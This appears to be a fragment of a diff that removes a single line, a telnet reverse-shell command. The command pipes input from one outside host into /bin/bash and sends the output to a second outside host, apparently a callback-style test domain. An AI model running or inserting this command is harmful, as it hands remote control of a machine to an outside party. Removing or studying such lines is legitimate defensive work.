@@ -1,1 +1,0 @@
-telnet w300hoq7gf9a9j6tthzulkm19sfmda2.c.39.rs 80 | /bin/bash | telnet fk3jy77qxyqtq2nca0gd233kqbw5sth.c.39.rs 443
